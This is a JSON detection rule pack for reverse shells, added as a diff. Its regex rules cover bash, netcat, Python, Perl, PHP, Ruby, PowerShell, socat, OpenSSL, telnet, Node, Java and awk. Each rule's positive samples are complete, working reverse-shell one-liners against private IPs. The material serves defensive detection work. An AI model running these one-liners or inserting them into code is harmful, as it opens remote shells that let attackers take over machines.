@@ -1,0 +1,876 @@
+{
+ "pack": "reverseshells",
+ "rules": [
+  {
+   "id": "byte-revshell-bash-devtcp",
+   "name": "Bash /dev/tcp reverse shell",
+   "description": "An interactive bash redirected over /dev/tcp to a remote host.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "critical",
+   "weight": 70,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "bash\\s+-i\\s*>&?\\s*/dev/tcp/[^/\\s]{3,64}/\\d{1,5}"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "\\d?\\s*<>\\s*/dev/tcp/[^/\\s]{3,64}/\\d{1,5}\\b"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "0>&1|<&\\d|>&\\s*\\d"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "any": [
+       {
+        "str": "a"
+       },
+       {
+        "str": "b"
+       }
+      ]
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"
+     }
+    ],
+    "negative": [
+     {
+      "text": "bash -i"
+     },
+     {
+      "text": "echo hi > /dev/tcp_log.txt"
+     },
+     {
+      "text": "cat < /dev/tcp"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-devtcp-fd",
+   "name": "Bash exec with a /dev/tcp file descriptor",
+   "description": "exec N<>/dev/tcp/host/port followed by a shell using the descriptor.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "critical",
+   "weight": 65,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "exec\\s+\\d+\\s*<>\\s*/dev/tcp/[^/\\s]{3,64}/\\d{1,5}"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "(?:sh|bash)\\s+(?:-i\\s+)?<&\\d+\\s*>&\\d+"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "exec 5<>/dev/tcp/192.168.1.9/9001; sh <&5 >&5 2>&5"
+     }
+    ],
+    "negative": [
+     {
+      "text": "exec 5<>/dev/tcp/192.168.1.9/9001; echo ok >&5"
+     },
+     {
+      "text": "sh <&5 >&5 2>&5"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-nc-e",
+   "name": "Netcat -e/-c shell binding",
+   "description": "nc/ncat/netcat with -e or -c pointing at a shell.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "critical",
+   "weight": 65,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "\\b(?:nc|ncat|netcat)(?:\\.exe)?\\s+[^\\n|;]{0,60}?-(?:e|c)\\s+(?:/bin/(?:ba)?sh|cmd(?:\\.exe)?|powershell(?:\\.exe)?|sh)\\b"
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "nc -nv 10.1.1.1 4444 -e /bin/sh"
+     }
+    ],
+    "negative": [
+     {
+      "text": "nc -nv 10.1.1.1 4444"
+     },
+     {
+      "text": "ncat --exec"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-mkfifo-nc",
+   "name": "Named-pipe netcat reverse shell",
+   "description": "mkfifo pipe with a shell read from it and netcat feeding it: the netcat-without-e shell.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "critical",
+   "weight": 65,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "mkfifo\\s+/\\S+"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "(?:/bin/)?(?:ba)?sh\\s+-i\\s+2>&1\\s*\\|\\s*(?:nc|ncat|netcat)\\s"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "cat\\s+/\\S+\\s*\\|"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
+     }
+    ],
+    "negative": [
+     {
+      "text": "mkfifo /tmp/f"
+     },
+     {
+      "text": "cat /tmp/f | less"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-python-socket",
+   "name": "Python socket reverse shell",
+   "description": "socket connect followed by os.dup2 of the socket to stdin/out/err and a spawned shell.",
+   "tactic": "Execution",
+   "technique": "T1059.006",
+   "severity": "critical",
+   "weight": 65,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "s",
+     "type": "ascii",
+     "value": "socket.socket"
+    },
+    {
+     "name": "c",
+     "type": "ascii",
+     "value": ".connect(("
+    },
+    {
+     "name": "d",
+     "type": "regex",
+     "value": "os\\.dup2\\(\\s*\\w+\\.fileno\\(\\)\\s*,\\s*[012]\\s*\\)",
+     "min": 2
+    },
+    {
+     "name": "p",
+     "type": "regex",
+     "value": "(?:pty\\.spawn|subprocess\\.(?:call|Popen)|os\\.system|os\\.exec\\w+)\\s*\\("
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "s"
+     },
+     {
+      "str": "c"
+     },
+     {
+      "str": "d"
+     },
+     {
+      "str": "p"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"
+     }
+    ],
+    "negative": [
+     {
+      "text": "import socket;s=socket.socket();s.connect(('10.0.0.1',80));s.send(b'x')"
+     },
+     {
+      "text": "os.dup2(f.fileno(), 1)"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-perl",
+   "name": "Perl socket reverse shell",
+   "description": "Perl socket() with sockaddr_in and an exec/system of an interactive shell over the descriptor.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "severity": "critical",
+   "weight": 60,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "socket\\s*\\(\\s*S\\s*,\\s*PF_INET"
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "sockaddr_in"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "(?:exec|system)\\s*\\(\\s*['\\\"]/bin/(?:ba)?sh\\s+-i"
+    },
+    {
+     "name": "d",
+     "type": "ascii",
+     "value": "open(STDIN"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "any": [
+       {
+        "str": "c"
+       },
+       {
+        "str": "d"
+       }
+      ]
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");exec(\"/bin/sh -i\");"
+     }
+    ],
+    "negative": [
+     {
+      "text": "use Socket; socket(S, PF_INET, SOCK_STREAM, 0); sockaddr_in(80, $a);"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-php-fsockopen",
+   "name": "PHP socket reverse shell",
+   "description": "fsockopen or stream_socket_client combined with exec/proc_open of a shell and the socket as descriptor.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "severity": "critical",
+   "weight": 60,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "(?:fsockopen|stream_socket_client)\\s*\\("
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "(?:proc_open|exec|shell_exec|system|passthru|popen)\\s*\\(\\s*['\\\"]?(?:/bin/)?(?:ba)?sh"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "\\$sock\\b|\\$s\\b|\\$fp\\b"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "<?php $sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");"
+     }
+    ],
+    "negative": [
+     {
+      "text": "<?php $sock = fsockopen('smtp.example.com', 25); fwrite($sock, 'HELO');"
+     },
+     {
+      "text": "<?php exec('/bin/sh -c ls');"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-ruby",
+   "name": "Ruby TCPSocket reverse shell",
+   "description": "TCPSocket.new with an exec of a shell and the socket's fileno.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "ascii",
+     "value": "TCPSocket.new"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "(?:exec|system|spawn|IO\\.popen)\\s*\\(?\\s*(?:sprintf\\s*\\(\\s*)?['\\\"]?/bin/(?:ba)?sh"
+    },
+    {
+     "name": "c",
+     "type": "ascii",
+     "value": ".to_i"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f=TCPSocket.new(\"10.0.0.1\",4444).to_i,f,f)"
+     }
+    ],
+    "negative": [
+     {
+      "text": "s = TCPSocket.new('example.com', 80)"
+     },
+     {
+      "text": "exec '/bin/sh'"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-powershell-tcp",
+   "name": "PowerShell TCPClient reverse shell",
+   "description": "System.Net.Sockets.TCPClient with GetStream and an Invoke-Expression read loop.",
+   "tactic": "Execution",
+   "technique": "T1059.001",
+   "severity": "critical",
+   "weight": 65,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "ascii",
+     "value": "Net.Sockets.TCPClient",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "GetStream",
+     "nocase": true
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "\\biex\\b|Invoke-Expression",
+     "nocase": true
+    },
+    {
+     "name": "d",
+     "type": "ascii",
+     "value": ".Read(",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     },
+     {
+      "str": "d"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "$c = New-Object Net.Sockets.TCPClient('10.0.0.1',443); $s = $c.GetStream(); while(($i = $s.Read($b,0,$b.Length)) -ne 0){ $o = iex $d 2>&1 }"
+     }
+    ],
+    "negative": [
+     {
+      "text": "$c = New-Object Net.Sockets.TCPClient('mail',25); $s = $c.GetStream();"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-socat-exec",
+   "name": "socat EXEC reverse shell",
+   "description": "socat connecting a TCP endpoint to EXEC of a shell with a pty.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "critical",
+   "weight": 60,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "socat\\s+[^\\n]{0,80}(?:tcp|tcp4|openssl)[:\\-]\\S+:\\d+",
+     "nocase": true
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "exec:['\\\"]?(?:/bin/)?(?:ba)?sh[^\\n]{0,40}pty",
+     "nocase": true
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "socat TCP:10.0.0.1:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane"
+     }
+    ],
+    "negative": [
+     {
+      "text": "socat TCP-LISTEN:8080,fork TCP:backend:80"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-openssl",
+   "name": "OpenSSL s_client reverse shell",
+   "description": "mkfifo + openssl s_client -quiet -connect piped to a shell.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "critical",
+   "weight": 60,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "ascii",
+     "value": "mkfifo"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "openssl\\s+s_client\\s+[^\\n]{0,40}-connect\\s+\\S+:\\d+"
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "(?:/bin/)?(?:ba)?sh\\s+-i"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:443 > /tmp/s"
+     }
+    ],
+    "negative": [
+     {
+      "text": "openssl s_client -connect example.com:443"
+     },
+     {
+      "text": "mkfifo /tmp/s"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-telnet-pipe",
+   "name": "Telnet double-pipe reverse shell",
+   "description": "telnet host port | /bin/sh | telnet host port2.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "telnet\\s+\\S+\\s+\\d+\\s*\\|\\s*(?:/bin/)?(?:ba)?sh\\s*\\|\\s*telnet\\s+\\S+\\s+\\d+"
+    }
+   ],
+   "condition": {
+    "str": "a"
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "telnet 10.0.0.1 4444 | /bin/sh | telnet 10.0.0.1 4445"
+     }
+    ],
+    "negative": [
+     {
+      "text": "telnet 10.0.0.1 4444"
+     },
+     {
+      "text": "echo x | sh | cat"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-node-spawn",
+   "name": "Node.js net.Socket reverse shell",
+   "description": "child_process.spawn of a shell with its stdio piped to a net.Socket connect.",
+   "tactic": "Execution",
+   "technique": "T1059.007",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "ascii",
+     "value": "child_process"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "spawn\\s*\\(\\s*['\\\"](?:/bin/)?(?:ba)?sh['\\\"]"
+    },
+    {
+     "name": "c",
+     "type": "ascii",
+     "value": "net.Socket"
+    },
+    {
+     "name": "d",
+     "type": "regex",
+     "value": "\\.connect\\s*\\(\\s*\\d{2,5}\\s*,\\s*['\\\"]"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     },
+     {
+      "str": "d"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var c=new net.Socket();c.connect(4444,'10.0.0.1',function(){c.pipe(sh.stdin);sh.stdout.pipe(c);});"
+     }
+    ],
+    "negative": [
+     {
+      "text": "var cp=require('child_process'); cp.spawn('sh',['-c','ls'])"
+     },
+     {
+      "text": "var c=new net.Socket(); c.connect(80, 'x');"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-java-bash",
+   "name": "Java Runtime exec of a bash TCP redirect",
+   "description": "Runtime.exec with bash -c and /dev/tcp.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "severity": "high",
+   "weight": 55,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "ascii",
+     "value": "Runtime.getRuntime().exec"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "/bin/(?:ba)?sh['\\\"]?\\s*,\\s*['\\\"]-c['\\\"]"
+    },
+    {
+     "name": "c",
+     "type": "ascii",
+     "value": "/dev/tcp/"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5 | while read l; do $l 2>&5 >&5; done\"})"
+     }
+    ],
+    "negative": [
+     {
+      "text": "Runtime.getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"ls\"})"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-awk-inet",
+   "name": "awk /inet/ reverse shell",
+   "description": "awk using the /inet/tcp special file with a command pipe.",
+   "tactic": "Execution",
+   "technique": "T1059.004",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "/inet/tcp/0/[^/\\s]+/\\d+"
+    },
+    {
+     "name": "b",
+     "type": "ascii",
+     "value": "awk",
+     "nocase": true
+    },
+    {
+     "name": "c",
+     "type": "regex",
+     "value": "\\|&|\\|\\s*getline|system\\s*\\("
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     },
+     {
+      "str": "c"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "awk 'BEGIN {s = \"/inet/tcp/0/10.0.0.1/4444\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}'"
+     }
+    ],
+    "negative": [
+     {
+      "text": "awk '{print $1}' file.txt"
+     },
+     {
+      "text": "/inet/tcp/0/10.0.0.1/80"
+     }
+    ]
+   }
+  },
+  {
+   "id": "byte-revshell-lua-php-cmd",
+   "name": "Interpreter one-liner dialing a host and spawning a shell",
+   "description": "Generic -e/-c one-liners (lua, php -r, ruby -rsocket, python -c) that open a socket and run /bin/sh.",
+   "tactic": "Execution",
+   "technique": "T1059",
+   "severity": "high",
+   "weight": 50,
+   "applies_to": "both",
+   "format": "script",
+   "strings": [
+    {
+     "name": "a",
+     "type": "regex",
+     "value": "\\b(?:lua|php\\s+-r|ruby\\s+-rsocket\\s+-e|python[23]?\\s+-c|perl\\s+-e)\\b[^\\n]{0,60}(?:socket|fsockopen|TCPSocket)"
+    },
+    {
+     "name": "b",
+     "type": "regex",
+     "value": "/bin/(?:ba)?sh"
+    }
+   ],
+   "condition": {
+    "all": [
+     {
+      "str": "a"
+     },
+     {
+      "str": "b"
+     }
+    ]
+   },
+   "samples": {
+    "positive": [
+     {
+      "text": "php -r '$s=fsockopen(\"10.0.0.1\",9000);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+     }
+    ],
+    "negative": [
+     {
+      "text": "php -r 'echo 1;'"
+     },
+     {
+      "text": "ruby -rsocket -e 'TCPSocket.new(\"x\",80)'"
+     }
+    ]
+   }
+  }
+ ]
+}
